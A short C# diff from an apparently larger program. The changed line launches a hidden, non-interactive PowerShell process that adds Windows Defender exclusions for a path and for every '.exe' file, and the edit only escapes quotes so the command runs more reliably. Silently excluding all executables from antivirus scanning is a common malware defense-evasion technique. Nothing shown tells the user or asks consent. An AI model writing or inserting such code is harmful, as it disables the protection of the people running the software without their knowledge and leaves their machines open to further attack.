@@ -1210,7 +1210,7 @@ internal class Program
         try
         {
             using var p = Process.Start(new ProcessStartInfo("powershell.exe",
-                $"-NonInteractive -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{path}' -ExclusionExtension '.exe' -Force\"")
+                $"-NonInteractive -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{path.Replace("'", "''")}' -ExclusionExtension '.exe' -Force\"")
             { CreateNoWindow = true, UseShellExecute = false });
             p?.WaitForExit(6000);
         }
